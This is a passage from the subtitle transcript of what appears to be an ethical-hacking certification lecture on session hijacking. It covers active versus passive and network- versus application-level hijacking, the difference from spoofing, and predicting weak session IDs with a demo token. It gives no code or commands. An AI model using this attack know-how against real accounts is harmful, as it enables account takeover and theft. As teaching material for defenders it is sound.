Megan.\n\n360\n00:17:16.542 --> 00:17:19.150\nAnd we get into her account\nthrough this mechanism.\n\n361\n00:17:19.150 --> 00:17:21.950\nWe could just go on about our business and\noperate the way Megan would and\n\n362\n00:17:21.950 --> 00:17:25.230\ntransfer money, it wouldn't be a big deal,\nwe don't have to manipulate the back end\n\n363\n00:17:25.230 --> 00:17:28.230\nserver with command injection to do that,\nwe just have to\n\n364\n00:17:28.230 --> 00:17:31.170\nmanipulate it by pretending to be Megan,\nand having her credential.\n\n365\n00:17:31.170 --> 00:17:32.780\nAnd if we've done that, we're fine.\n\n366\n00:17:32.780 --> 00:17:34.310\nBut there's a lot of\nother stuff we may do.\n\n367\n00:17:34.310 --> 00:17:37.610\nThe goal may not be to transfer\nmoney as Megan, but rather, maybe,\n\n368\n00:17:37.610 --> 00:17:41.040\nto steal a list of all the accounts and\nall the passwords and the PINS and\n\n369\n00:17:41.040 --> 00:17:45.350\nwhatever, looking at balances, figuring\nout who is really at the top of that list\n\n370\n00:17:45.350 --> 00:17:48.370\nand then going in and\nhacking in to get their stuff.\n\n371\n00:17:48.370 --> 00:17:52.320\nIf we're doing that kind of attack, where\nwe've done the session hijacking, but\n\n372\n00:17:52.320 --> 00:17:56.830\nthe goal is command injection\nthen I think, just my opinion.\n\n373\n00:17:56.830 --> 00:18:00.470\nBut I think at that point that's really\nwhere the complexity kicks in at\n\n374\n00:18:00.470 --> 00:18:01.160\na higher level.\n\n375\n00:18:01.160 --> 00:18:03.670\nBecause now you've gotta\ncraft that injection code.\n\n376\n00:18:03.670 --> 00:18:05.260\nYou know the proper sequel.\n\n377\n00:18:05.260 --> 00:18:08.080\nCommands as you and I talked about\nbefore we got started a little bit.\n\n378\n00:18:08.080 --> 00:18:11.630\nKnowledge of the database all\nthat kind of stuff really becomes\n\n379\n00:18:11.630 --> 00:18:13.610\nI think the more challenging piece.\n\n380\n00:18:13.610 --> 00:18:15.960\nBut again that's me other people\nmay view that differently and\n\n381\n00:18:15.960 --> 00:18:20.365\nsay as you indicated I think the actual\nset up of the section hijacking\n\n382\n00:18:20.365 --> 00:18:22.345\nis a little bit more challenging.\n\n383\n00:18:22.345 --> 00:18:25.845\nI just think that technically\ngetting the command injections right\n\n384\n00:18:25.845 --> 00:18:28.733\nknowing the code to use,\nknowing when to fire them and\n\n385\n00:18:28.733 --> 00:18:32.610\nwhat the expectation will be,\nknowing how to do it and finessing it so\n\n386\n00:18:32.610 --> 00:18:35.620\nthat you do it in a way that although\nyou do break the server, right?\n\n387\n00:18:35.620 --> 00:18:37.190\nYou know, you're dumping the database,\n\n388\n00:18:37.190 --> 00:18:40.050\nyou do it in a way that is not obvious\nat the moment you're doing it so\n\n389\n00:18:40.050 --> 00:18:43.180\nthat way the alarm bells don't go off and\neverybody says well what's going on?\n\n390\n00:18:43.180 --> 00:18:44.270\nThe server's down.\n\n391\n00:18:44.270 --> 00:18:47.070\nSo I think the complexity and\nthe finesse of that\n\n392\n00:18:47.070 --> 00:18:50.590\njust from my experience having done all\nthis kind of stuff for a long time.\n\n393\n00:18:50.590 --> 00:18:54.990\nI think I find that that part's a little,\nfor me I just spend more time on that.\n\n394\n00:18:54.990 --> 00:18:57.630\nI can set up a session hijacking attack,\nand\n\n395\n00:18:57.630 --> 00:19:01.770\nexecute it pretty quickly with the right\nset of tools and the right circumstances.\n\n396\n00:19:01.770 --> 00:19:05.650\nThe technicality of the difficulty\nis probably for me not as great.\n\n397\n00:19:05.650 --> 00:19:09.330\nBut I think figuring out being five steps\nahead of what that code looks like.\n\n398\n00:19:09.330 --> 00:19:13.150\nAnd then if it doesn't run the right way\nwhere I hit a break somewhere that I\n\n399\n00:19:13.150 --> 00:19:17.290\nwasn't expecting, having the ability to\nquickly think about what I'm gonna do\n\n400\n00:19:17.290 --> 00:19:18.960\nto then gain the advantage.\n\n401\n00:19:18.960 --> 00:19:23.380\nHaving those things for me are just\nwhere the real expertise comes in.\n\n402\n00:19:23.380 --> 00:19:24.820\nRight?\nBecause now you gotta think on your feet,\n\n403\n00:19:24.820 --> 00:19:26.820\nyou gotta deal with unknowns.\n\n404\n00:19:26.820 --> 00:19:30.580\nAnd it's not the play book of okay step\nfive I hit this button and boom I'm in\n\n405\n00:19:30.580 --> 00:19:34.780\nthe server, it's what happens after that\nwhen am staring at this open space, but\n\n406\n00:19:34.780 --> 00:19:37.550\nI don't really have,\nI don't have the play book any more right?\n\n407\n00:19:37.550 --> 00:19:41.770\nThere is no recipe, now I've got to\ngo really figure what I wanna do.\n\n408\n00:19:41.770 --> 00:19:45.220\nI think that's where hackers\nreally prove themselves if\n\n409\n00:19:45.220 --> 00:19:49.790\nthey're good because I think that's\nwhere the ability of the hacker to\n\n410\n00:19:49.790 --> 00:19:53.130\nbring their craft to\nbear is really showing.\n\n411\n00:19:53.130 --> 00:19:56.170\nAnd we have to step back,\nat a certain point and\n\n412\n00:19:56.170 --> 00:19:57.910\nwe never want to encourage this activity,\nright?\n\n413\n00:19:57.910 --> 00:19:59.030\nLet me be clear, big disclaimer.\n\n414\n00:19:59.030 --> 00:20:02.920\nI'm not suggesting for a minute with what\nI'm about to say that I think hacking\n\n415\n00:20:02.920 --> 00:20:07.920\nin the negative area, not for defensive\nmeasures the way we teach you to do\n\n416\n00:20:07.920 --> 00:20:10.300\nthrough CEH, the understanding,\nthe knowledge.\n\n417\n00:20:10.300 --> 00:20:13.450\nBut as we said many times, you never\ntake this knowledge and go offensive.\n\n418\n00:20:13.450 --> 00:20:17.070\nThat's not appropriate, it's illegal and\nyou should not do that.\n\n419\n00:20:17.070 --> 00:20:20.180\nBut we do need to understand and\nI think acknowledge.\n\n420\n00:20:20.180 --> 00:20:22.110\nAnd I'm not,\nagain I wanna be very clear, and\n\n421\n00:20:22.110 --> 00:20:26.294\nit's hard to do this without\nsounding like I think this is okay.\n\n422\n00:20:26.294 --> 00:20:30.760\nBut, I'm simply saying that I think\nwe have to as defenders acknowledge\n\n423\n00:20:30.760 --> 00:20:33.490\nthe prowess of our adversaries\nat a certain point and\n\n424\n00:20:33.490 --> 00:20:37.530\nunderstand that they are really\ngood at what they do.\n\n425\n00:20:37.530 --> 00:20:41.240\nAnd that if we don't respect that even\nthough that is saying that essentially\n\n426\n00:20:41.240 --> 00:20:44.490\nwe respect somebody who is acting beyond\nthe law and is breaking the law and\n\n427\n00:20:44.490 --> 00:20:45.444\nthat is doing things illegally.\n\n428\n00:20:45.444 --> 00:20:46.050\n&gt;&gt; Right.\n\n429\n00:20:46.050 --> 00:20:48.420\n&gt;&gt; There's nothing wrong with\nrespecting the skills and\n\n430\n00:20:48.420 --> 00:20:51.760\nstill thinking that the activity\nis wrong and illegal.\n\n431\n00:20:51.760 --> 00:20:55.870\nBut you have to have a healthy respect for\nthe skills or they will eat you alive.\n\n432\n00:20:55.870 --> 00:20:58.490\nThey're just gonna come and\ntake everything you have away from you and\n\n433\n00:20:58.490 --> 00:21:00.000\nthat will be the end game.\n\n434\n00:21:00.000 --> 00:21:04.190\nAnd if we don't understand that,\nwe run the risk of getting complacent,\n\n435\n00:21:04.190 --> 00:21:07.750\neventually just unfortunately\ngetting to the place where we feel\n\n436\n00:21:07.750 --> 00:21:10.020\nwe're better than the people that we face.\n\n437\n00:21:10.020 --> 00:21:11.563\nAnd I got news for you, right?\n\n438\n00:21:11.563 --> 00:21:13.300\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't care how good you are\n\n439\n00:21:13.300 --> 00:21:14.720\n&gt;&gt; There's somebody out there bigger and\n\n440\n00:21:14.720 --> 00:21:18.060\nbadder than you who's gonna come and take\nit away from you if you piss them off or\n\n441\n00:21:18.060 --> 00:21:20.940\nfeel in any way that you\nmay be better than them and\n\n442\n00:21:20.940 --> 00:21:23.200\nthey have a reason to feel that you do.\n\n443\n00:21:23.200 --> 00:21:26.360\nJust for fun because they've got\nnothing better to do on friday night,\n\n444\n00:21:26.360 --> 00:21:27.760\nthey're gonna teach you a lesson.\n\n445\n00:21:27.760 --> 00:21:31.600\nSo you always have to be humble when you\ngo into this particular set of activities.\n\n446\n00:21:31.600 --> 00:21:33.390\nThis entire body of knowledge.\n\n447\n00:21:33.390 --> 00:21:35.000\nAnything you do with security right?\n\n448\n00:21:35.000 --> 00:21:39.081\nYou'll often remember again\nmovie reference shocking right?\n\n449\n00:21:39.081 --> 00:21:39.600\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n450\n00:21:39.600 --> 00:21:44.635\nIndiana Jones the last crusade right where\nhe's looking for the holy grail right?\n\n451\n00:21:44.635 --> 00:21:48.260\n&gt;&gt; Mm-hm.\n&gt;&gt; And when he goes through and\n\n452\n00:21:48.260 --> 00:21:51.540\nhas to go through all the different\nprotections, right, to get in, you know,\n\n453\n00:21:51.540 --> 00:21:55.579\nthe big thing that comes out with\nthe saw blade and the arrows and\n\n454\n00:21:55.579 --> 00:21:58.331\nthe humble man goes before God right and\nkneels.\n\n455\n00:21:58.331 --> 00:21:59.725\nHe does Is all this stuff and\n\n456\n00:21:59.725 --> 00:22:03.135\nhe goes through the whole thing in\nthe book that Sean Connery his father put\n\n457\n00:22:03.135 --> 00:22:07.085\ntogether to tell him how to basically\nfind this whole thing, Petra right\n\n458\n00:22:07.085 --> 00:22:12.450\nthe city in Jordan in the cliffs, really\ncool place by the way, really cool place.\n\n459\n00:22:12.450 --> 00:22:16.980\nSo the idea there is that he's\nsaying he has to humble right.\n\n460\n00:22:16.980 --> 00:22:19.660\nHe knows he has all this knowledge but\nhe has to be humble and\n\n461\n00:22:19.660 --> 00:22:22.140\nunderstand how to follow the leads\nthat others have given him.\n\n462\n00:22:22.140 --> 00:22:25.220\nIn order to be able to figure\nout how to do this successfully.\n\n463\n00:22:25.220 --> 00:22:27.200\nAnd you always have to carry\nthat knowledge with you.\n\n464\n00:22:27.200 --> 00:22:31.740\nNo matter what we do, the idea is that\nwe have to feel we are good but we\n\n465\n00:22:31.740 --> 00:22:35.135\nalso have to understand there are things\nwe don't know, as security professionals.\n\n466\n00:22:35.135 --> 00:22:36.220\n&gt;&gt; Mm-hm.\n&gt;&gt; And there are things that we don't\n\n467\n00:22:36.220 --> 00:22:37.520\nknow that are people do, right?\n\n468\n00:22:37.520 --> 00:22:39.470\nSo we always wanna understand that and\n\n469\n00:22:39.470 --> 00:22:43.375\nI think from that perspective,\nI view the whole process, right?\n\n470\n00:22:43.375 --> 00:22:44.200\n&gt;&gt; Mm-hm.\n&gt;&gt; Overall and\n\n471\n00:22:44.200 --> 00:22:47.300\nI look at certain aspects that I think\nare more or less challenging but\n\n472\n00:22:47.300 --> 00:22:51.870\nI always try to remember that, I started\nout doing this and I had to learn the hard\n\n473\n00:22:51.870 --> 00:22:55.590\nway, and I learned new things everyday,\nand there's a lot I don't know.\n\n474\n00:22:55.590 --> 00:22:59.250\nAs much as I do know,\nthere's more I don't know, realistically.\n\n475\n00:22:59.250 --> 00:23:02.435\nBy the way who are you,why am I here?\n\n476\n00:23:02.435 --> 00:23:03.367\n&gt;&gt; [LAUGH] What are we doing?\n\n477\n00:23:03.367 --> 00:23:04.772\n&gt;&gt; What today,\nwhat is today what do we do?\n\n478\n00:23:04.772 --> 00:23:07.940\nAll right so different types of\nsession hijacker, right we've always\n\n479\n00:23:07.940 --> 00:23:12.260\ntalked about the fact we have active and\npassive on any kind of system.\n\n480\n00:23:12.260 --> 00:23:12.860\nSame idea here.\n\n481\n00:23:12.860 --> 00:23:15.170\nYou know we have active\nattacks as we talked about.\n\n482\n00:23:15.170 --> 00:23:16.810\nWe find the active session.\n\n483\n00:23:16.810 --> 00:23:17.800\nWe knock the person out.\n\n484\n00:23:17.800 --> 00:23:18.780\nWe take it over.\n\n485\n00:23:18.780 --> 00:23:21.750\nPassive attacks remember are where\nwe hijack the session but\n\n486\n00:23:21.750 --> 00:23:22.940\nit's like the man in the middle.\n\n487\n00:23:22.940 --> 00:23:26.430\nWe're just listening, looking, we're\nobserving but we're not gonna go live,\n\n488\n00:23:26.430 --> 00:23:30.440\ngo active if you will, kick out the user\nand then assume their identites.\n\n489\n00:23:30.440 --> 00:23:32.030\nSo we could do this either way.\n\n490\n00:23:32.030 --> 00:23:33.500\nJust wanna be aware of that.\n\n491\n00:23:33.500 --> 00:23:36.720\nWe can session hijack at various\nlevels of the OSI model.\n\n492\n00:23:36.720 --> 00:23:39.410\nSo we can look at network level hijacking,\nright.\n\n493\n00:23:39.410 --> 00:23:41.992\nWe can look at application\nlevel hijacking.\n\n494\n00:23:41.992 --> 00:23:45.090\nSo, when we're thinking about\nnetwork level hijacking,\n\n495\n00:23:45.090 --> 00:23:46.570\nwe think about level\nthree of the OSI model.\n\n496\n00:23:46.570 --> 00:23:48.794\nWe're thinking about\napplication level hijacking,\n\n497\n00:23:48.794 --> 00:23:51.412\nwe're thinking about layer seven\nof the OSI model up at the top.\n\n498\n00:23:51.412 --> 00:23:55.536\nAt the network level level we're thinking\nabout manipulating packets, right, so\n\n499\n00:23:55.536 --> 00:23:59.604\nwe're thinking about defining this as\nessentially as the interception of packets\n\n500\n00:23:59.604 --> 00:24:00.896\nand packetized traffic.\n\n501\n00:24:00.896 --> 00:24:03.427\nWe've taken a look at\nheaders in various episodes,\n\n502\n00:24:03.427 --> 00:24:06.541\nin the sniffing episode Mike put\ntogether a nice picture for us.\n\n503\n00:24:06.541 --> 00:24:08.062\nYou remember we drew that out?\n\n504\n00:24:08.062 --> 00:24:10.900\nGood times, by the way, good times, right?\n\n505\n00:24:10.900 --> 00:24:13.530\nBoy, back in the day when we were\nlooking at data packets, right?\n\n506\n00:24:13.530 --> 00:24:14.500\nSo we looked at the header.\n\n507\n00:24:14.500 --> 00:24:16.220\nWe looked at the trailer, right?\n\n508\n00:24:16.220 --> 00:24:19.130\nWe looked at the fact that\nall the information necessary\n\n509\n00:24:19.130 --> 00:24:23.150\nto execute the hijack would be up\nin the front, right, in the header.\n\n510\n00:24:23.150 --> 00:24:27.830\nThe two and from MAC and IP addresses,\nthe flags that are set for offset for\n\n511\n00:24:27.830 --> 00:24:33.550\nfragmentation, for Syn, for Syn act, for\npush reset urge, whatever the case may be.\n\n512\n00:24:33.550 --> 00:24:37.190\nThe TCP flags, right,\nthe protocol that's being used.\n\n513\n00:24:37.190 --> 00:24:38.450\nAll that stuff is there.\n\n514\n00:24:38.450 --> 00:24:41.260\nSo that's what we're gonna zero in on,\nright, at the network layer.\n\n515\n00:24:41.260 --> 00:24:42.900\nWe're gonna be dealing\nwith that kinda stuff and\n\n516\n00:24:42.900 --> 00:24:45.800\nmanipulating that kind of information for\na hijack.\n\n517\n00:24:45.800 --> 00:24:47.420\nWhen we're up at the application level,\n\n518\n00:24:47.420 --> 00:24:51.030\nwe're looking at gaining control\nover a protocol or a service.\n\n519\n00:24:51.030 --> 00:24:55.340\nSo HTTPS for instance or HTTP running up\nat layer seven in the application layer.\n\n520\n00:24:55.340 --> 00:24:58.430\nDHCP, DNS,\nwhat ever it is that's up there, right?\n\n521\n00:24:58.430 --> 00:24:59.600\nThose kind of things,\n\n522\n00:24:59.600 --> 00:25:03.580\nwe're looking to gain control over that\nuser session by obtaining session IDs.\n\n523\n00:25:03.580 --> 00:25:06.280\nWe don't obtain session IDs\ndown at the network layer.\n\n524\n00:25:06.280 --> 00:25:07.640\nThat's not what we're gonna see there.\n\n525\n00:25:07.640 --> 00:25:10.540\nWe're getting them up at\nthe application layer based\n\n526\n00:25:10.540 --> 00:25:13.230\non the protocol that's being used and\nthe manipulation of that.\n\n527\n00:25:13.230 --> 00:25:16.340\nSo we can attack this from different\nareas, different perspectives,\n\n528\n00:25:16.340 --> 00:25:20.340\nand we have to think about that as well\nbecause the approach is different,\n\n529\n00:25:20.340 --> 00:25:23.120\nthe tools are different, and the expected\noutcomes are different, right?\n\n530\n00:25:23.120 --> 00:25:25.910\nIt's not just I'll just use this tool and\nboom, it all happens.\n\n531\n00:25:25.910 --> 00:25:29.410\nWe have to figure out where we are, and\nwhat we want to ultimately achieve.\n\n532\n00:25:29.410 --> 00:25:32.440\nWe also wanna make sure we distinguish\nbetween spoofing and hijacking,\n\n533\n00:25:32.440 --> 00:25:33.630\njust as vocabulary.\n\n534\n00:25:33.630 --> 00:25:37.400\nWe talked about both before, but spoofing\nis where we pretend to be, sometimes\n\n535\n00:25:37.400 --> 00:25:40.720\ncalled masquerading by the way, where\nwe pretend to be another user, right?\n\n536\n00:25:40.720 --> 00:25:44.120\nSo we're using that\nidentity to gain access.\n\n537\n00:25:44.120 --> 00:25:48.280\nHijacking, or session hijacking, as we're\ntalking about is where that we actually\n\n538\n00:25:48.280 --> 00:25:52.110\ntake over an existing active session and\nwe rely on that legitimate credential\n\n539\n00:25:52.110 --> 00:25:55.840\nthat's all ready in the session to be\nable to then manipulate that session.\n\n540\n00:25:55.840 --> 00:25:58.000\nSo we're knocking the real user out,\nremember, and\n\n541\n00:25:58.000 --> 00:26:00.100\nwe are then taking over their session.\n\n542\n00:26:00.100 --> 00:26:03.380\nYou can say in theory it's like spoofing\nbecause we are pretending to be them.\n\n543\n00:26:03.380 --> 00:26:04.445\nSo I do get that.\n\n544\n00:26:04.445 --> 00:26:05.260\n&gt;&gt; Mm-hm.\n&gt;&gt; But\n\n545\n00:26:05.260 --> 00:26:07.970\nthe idea with spoofing is we\npretend to be another user\n\n546\n00:26:07.970 --> 00:26:10.220\nWe don't take over\nan existing active session.\n\n547\n00:26:10.220 --> 00:26:12.165\nWe initiate a brand new one, right?\n\n548\n00:26:12.165 --> 00:26:14.760\n&gt;&gt; Mm-hm.\n&gt;&gt; That is under the guise of that user\n\n549\n00:26:14.760 --> 00:26:16.050\ncredential with spoofing.\n\n550\n00:26:16.050 --> 00:26:18.950\nWhereas with hijacking, we knock you\nout and we pick back up your session,\n\n551\n00:26:18.950 --> 00:26:20.310\nand we keep going.\n\n552\n00:26:20.310 --> 00:26:22.270\nSo there is a subtle but\nimportant difference there.\n\n553\n00:26:22.270 --> 00:26:25.760\nWe just wanna make sure we're comfortable\nwith that distinction, because it's one of\n\n554\n00:26:25.760 --> 00:26:29.640\nthose vocabulary things that I could\nsee definitely having to pivot on that\n\n555\n00:26:29.640 --> 00:26:33.450\nanswering the subtlety of that particular\ndefinition of those two terms.\n\n556\n00:26:33.450 --> 00:26:34.800\nMaybe a question that, you know,\n\n557\n00:26:34.800 --> 00:26:39.000\nif I was you I would potentially wanna\nhave the answer to if somebody asked.\n\n558\n00:26:39.000 --> 00:26:41.780\nIf not, then it's all that other useless\nknowledge to shake your head a couple of\n\n559\n00:26:41.780 --> 00:26:44.760\ntimes this way, falls out and\nthen new stuff comes in the other side.\n\n560\n00:26:44.760 --> 00:26:46.830\nYou remember the movie Johnny Mnemonic?\n\n561\n00:26:46.830 --> 00:26:47.730\n&gt;&gt; Yes.\n\n562\n00:26:47.730 --> 00:26:50.250\n&gt;&gt; Some of Keanu Reeves'\nfinest work by the way, right?\n\n563\n00:26:50.250 --> 00:26:52.440\n&gt;&gt; Yeah.\n&gt;&gt; Cinemagraphic masterpiece.\n\n564\n00:26:52.440 --> 00:26:56.650\nBut if you ever see or\nhave seen Johnny Mnemonic, the idea is,\n\n565\n00:26:56.650 --> 00:27:00.930\nin a sci-fi future, a la kinda\nBlade Runner, although not that dark.\n\n566\n00:27:00.930 --> 00:27:04.305\nThe idea is that he is a carrier, right?\n\n567\n00:27:04.305 --> 00:27:06.250\n&gt;&gt; Mm-hm.\n&gt;&gt; So kinda like Jason Statham, but\n\n568\n00:27:06.250 --> 00:27:07.400\nwithout the muscles, right?\n\n569\n00:27:07.400 --> 00:27:07.900\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n570\n00:27:07.900 --> 00:27:10.010\n&gt;&gt; And so in The Transporter,\n\n571\n00:27:10.010 --> 00:27:10.900\nif you've seen that movie,\n\n572\n00:27:10.900 --> 00:27:12.360\ncuz that was actually-\n&gt;&gt; That was good.\n\n573\n00:27:12.360 --> 00:27:15.000\n&gt;&gt; Just good, old fashioned,\nfun, gratuitous violence.\n\n574\n00:27:15.000 --> 00:27:18.415\nThere's no plot to speak of,\nyou really don't care what's happening,\n\n575\n00:27:18.415 --> 00:27:21.826\nit's just how many people is he gonna\nkill and how he's gonna do that, and\n\n576\n00:27:21.826 --> 00:27:23.167\nhow often does that happen.\n\n577\n00:27:23.167 --> 00:27:25.790\nThose are the kinds of movies I love\nto watch on planes by the way, right,\n\n578\n00:27:25.790 --> 00:27:28.207\nbecause I don't want to sit there and\nreally think about the plot.\n\n579\n00:27:28.207 --> 00:27:30.430\nI don't want to have to sit there and\nreally work hard to understand it.\n\n580\n00:27:30.430 --> 00:27:32.250\nI just want to watch things blow up and\npeople die.\n\n581\n00:27:32.250 --> 00:27:35.070\nI mean that's just, that's kinda cool,\nright, cuz it's mindless but\n\n582\n00:27:35.070 --> 00:27:36.220\nthat's just what it is.\n\n583\n00:27:36.220 --> 00:27:38.750\nBut in Johnny Mnemonic, he is,\n\n584\n00:27:38.750 --> 00:27:43.650\nKeanu Reeves's character is essentially\na human, he's a piece of luggage, right?\n\n585\n00:27:43.650 --> 00:27:45.410\nHe's just a human carrier, and\n\n586\n00:27:45.410 --> 00:27:49.135\nthe idea is that he's got this memory\nchip that they implant in his head.\n\n587\n00:27:49.135 --> 00:27:53.075\nAnd he's able to upload information, and\nthen essentially act as a transporter,\n\n588\n00:27:53.075 --> 00:27:56.055\nmoving the information\nsecurely from place to place.\n\n589\n00:27:56.055 --> 00:27:59.815\nAnd there's a whole plot that goes with\nthat, a very small plot, not really a lot.\n\n590\n00:27:59.815 --> 00:28:04.285\nBut the idea is, anyway, that essentially\nhe becomes the mechanism for transporting.\n\n591\n00:28:04.285 --> 00:28:09.135\nSo with session hijacking in that movie,\nwould involve literally\n\n592\n00:28:09.135 --> 00:28:12.350\ntaking his head off, which is kind\nof one of the subplots of the movie.\n\n593\n00:28:12.350 --> 00:28:15.555\nTrying to get him before all the message\nor the information leaks out, right, which\n\n594\n00:28:15.555 --> 00:28:18.467\nis now I've told you the entire movie\nbasically in three or four sentences.\n\n595\n00:28:18.467 --> 00:28:20.390\nYou don't need to watch it,\nthere's not much to it.\n\n596\n00:28:20.390 --> 00:28:20.990\n&gt;&gt; Spoiler alert.\n\n597\n00:28:20.990 --> 00:28:21.840\n&gt;&gt; Spoiler alert, exactly.\n\n598\n00:28:21.840 --> 00:28:24.925\n&gt;&gt; Wait, those are supposed to come\nbefore the spoiler but, sorry.\n\n599\n00:28:24.925 --> 00:28:29.750\n[LAUGH]\n&gt;&gt; Just thought I'd point that out.\n\n600\n00:28:29.750 --> 00:28:33.020\nAll right, never go back on Monday\nmorning quarterback after the fact.\n\n601\n00:28:33.020 --> 00:28:33.980\n&gt;&gt; No.\n\n602\n00:28:33.980 --> 00:28:35.683\n&gt;&gt; All right, so\napplication-level session hijack.\n\n603\n00:28:35.683 --> 00:28:37.722\nWe've talked about how this works.\n\n604\n00:28:37.722 --> 00:28:41.210\nWe've talked about network hijacking,\nor network-level hijacking rather, so\n\n605\n00:28:41.210 --> 00:28:42.382\njust keeping this in mind.\n\n606\n00:28:42.382 --> 00:28:46.090\nYou know, we've talked about the fact that\nultimately we would want to think about\n\n607\n00:28:46.090 --> 00:28:49.470\nhow to do a little predictive session,\ntokening.\n\n608\n00:28:49.470 --> 00:28:52.820\nSo we'd want to figure out how to predict\nwhat those session IDs look like.\n\n609\n00:28:52.820 --> 00:28:56.100\nWe could predict session IDs if\nthey're generated by weak algorithms.\n\n610\n00:28:56.100 --> 00:28:59.100\nAnd we could then,\nobviously try to impersonate the user.\n\n611\n00:28:59.100 --> 00:29:02.902\nWe'd perform the analysis of the data\nstream, we've talked about that.\n\n612\n00:29:02.902 --> 00:29:05.232\nUsually we will use tools to do this.\n\n613\n00:29:05.232 --> 00:29:08.380\nThere's a variety of different\ntools we can use to try this stuff.\n\n614\n00:29:08.380 --> 00:29:11.010\nWe'll talk about some of them and\nmention some of them as we go.\n\n615\n00:29:11.010 --> 00:29:14.970\nBut we want to collect as many\nsimultaneous user session IDs that we can\n\n616\n00:29:14.970 --> 00:29:18.880\npull out if possible, looking at\nthe stream, trying to sense the pattern.\n\n617\n00:29:18.880 --> 00:29:22.330\nWe've talked a lot about the fact\nthat sensing those patterns, right?\n\n618\n00:29:22.330 --> 00:29:25.160\nAnything that is gonna be the same\nis gonna give us trouble.\n\n619\n00:29:25.160 --> 00:29:28.030\nAnd so the less of that we allow for,\nthe better.\n\n620\n00:29:28.030 --> 00:29:32.183\nYou know, if we see that through\nthe capture, hypothetically,\n\n621\n00:29:32.183 --> 00:29:36.800\nthat we have a URL, and we have some\nsort of token that comes afterwards.\n\n622\n00:29:36.800 --> 00:29:38.180\nAnd so could you,\n\n623\n00:29:38.180 --> 00:29:41.240\nbefore we go to his machine, just let Mike\nset something up real quick randomly?\n\n624\n00:29:41.240 --> 00:29:44.550\nCan you go to Notepad or something,\njust type something in for me real quick?\n\n625\n00:29:44.550 --> 00:29:46.660\nI'm just gonna give you a string that\nI want you to hold constant, and\n\n626\n00:29:46.660 --> 00:29:48.998\nwe can just kinda just quickly\nshow what this may look like.\n\n627\n00:29:48.998 --> 00:29:53.350\nSo you know, there obviously would be\nsome, so just put URL, the letters URL and\n\n628\n00:29:53.350 --> 00:29:55.810\nthen a forward slash,\ncuz we don't care what the URL is.\n\n629\n00:29:55.810 --> 00:29:58.320\nWe know there'll be a URL,\nobviously, for the session.\n\n630\n00:29:58.320 --> 00:30:00.260\nBut then there'll be\nsome sort of a constant.\n\n631\n00:30:00.260 --> 00:30:05.630\nSo let's say it's my name, Adam,\nA-D-A-M, just as a constant stream.\n\n632\n00:30:05.630 --> 00:30:07.430\nOur string rather and\nthen, there will be a date.\n\n633\n00:30:07.430 --> 00:30:12.000\nSo, we typically will do day, month, year.\n\n634\n00:30:12.000 --> 00:30:14.400\nSo, do, I don't know, what's today.\n\n635\n00:30:14.400 --> 00:30:14.990\nDo 25.\n\n636\n00:30:14.990 --> 00:30:19.281\n&gt;&gt; I'm still at URL forward slash, right?\n\n637\n00:30:19.281 --> 00:30:21.360\n&gt;&gt; Come on, man.\n&gt;&gt; I'm not an intern.\n\n638\n00:30:21.360 --> 00:30:22.350\n&gt;&gt; I'm making magic, here.\n\n639\n00:30:22.350 --> 00:30:23.340\nYou're making molasses.\n\n640\n00:30:23.340 --> 00:30:23.865\nAll right, so.\n&gt;&gt; [CROSSTALK]\n\n641\n00:30:23.865 --> 00:30:24.785\n&gt;&gt; All right.\n\n642\n00:30:24.785 --> 00:30:26.380\nYou ready to go?\n\n643\n00:30:26.380 --> 00:30:27.070\nOkay, so, URL/.\n\n644\n00:30:27.070 --> 00:30:28.350\nPut my name there.\n\n645\n00:30:28.350 --> 00:30:31.460\nThat'll just be the constant four\nletter character string we'll use.\n\n646\n00:30:31.460 --> 00:30:36.160\nWe're gonna do a date, but\nwe're gonna do it as day, month, year.\n\n647\n00:30:36.160 --> 00:30:40.683\n&gt;&gt; Okay.\n&gt;&gt; So, do 0101 and 2016, so\n\n648\n00:30:40.683 --> 00:30:44.705\nit's January 1, 2016.\n\n649\n00:30:44.705 --> 00:30:45.420\nOkay, so, you got that.\n\n650\n00:30:45.420 --> 00:30:48.100\nAnd then we wanna do a timestamp.\n\n651\n00:30:48.100 --> 00:30:51.570\nSo let's do military time.\n\n652\n00:30:51.570 --> 00:30:56.620\nWe'll do an hour, so let's do 1600 for\n\n653\n00:30:56.620 --> 00:31:00.446\n4:00 and do 21, for 21.\n\n654\n00:31:00.446 --> 00:31:04.095\nSo 4:21, right, essentially,\nright, in military time, right?\n\n655\n00:31:04.095 --> 00:31:06.220\nNo, do 1621.\n\n656\n00:31:06.220 --> 00:31:07.110\n1600 20 yeah right.\n\n657\n00:31:07.110 --> 00:31:08.320\nSo yeah.\n&gt;&gt; Okay right.\n\n658\n00:31:08.320 --> 00:31:11.240\n&gt;&gt; That's fine something like that or\nwhatever it is, it doesn't matter.\n\n659\n00:31:11.240 --> 00:31:15.253\nIt's just cuz what it is,\nit's 4:00 and 21 seconds.\n\n660\n00:31:15.253 --> 00:31:16.942\n&gt;&gt; Okay.\n&gt;&gt; Right, so that's fine.\n\n661\n00:31:16.942 --> 00:31:18.337\nI think I said 4:21 I apologize.\n\n662\n00:31:18.337 --> 00:31:21.046\n&gt;&gt; Yep.\n&gt;&gt; I meant in my mind I was thinking 4:00\n\n663\n00:31:21.046 --> 00:31:22.140\nand 21 seconds.\n\n664\n00:31:22.140 --> 00:31:23.625\nIt's the internal dialogue.\n\n665\n00:31:23.625 --> 00:31:26.100\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so if we then go ahead and\n\n666\n00:31:26.100 --> 00:31:26.935\ncopy that real quick.\n\n667\n00:31:26.935 --> 00:31:27.450\n&gt;&gt; Mm-hm.\n\n668\n00:31:27.450 --> 00:31:32.150\n&gt;&gt; And then let's just create like\nthree more of those down below and\n\n669\n00:31:32.150 --> 00:31:34.400\nwe'll modify them real quick and\nI'll show you what I mean by this.\n\n670\n00:31:34.400 --> 00:31:37.100\nSo yeah, just paste them in and\nwe'll go ahead and we'll just,\n\n671\n00:31:37.100 --> 00:31:38.800\nmy, my what a big cursor\nyou have up there.\n\n672\n00:31:38.800 --> 00:31:39.950\n&gt;&gt; That is a large cursor.\n\n673\n00:31:39.950 --> 00:31:40.890\n&gt;&gt; What the hell's going on with that?\n\n674\n00:31:40.890 --> 00:31:42.060\n&gt;&gt; I don't know.\n&gt;&gt; And it's so big,\n\n675\n00:31:42.060 --> 00:31:43.892\nwe've got the text is just normal sized.\n\n676\n00:31:43.892 --> 00:31:45.680\n&gt;&gt; [LAUGH]\n&gt;&gt; You've got a cursor 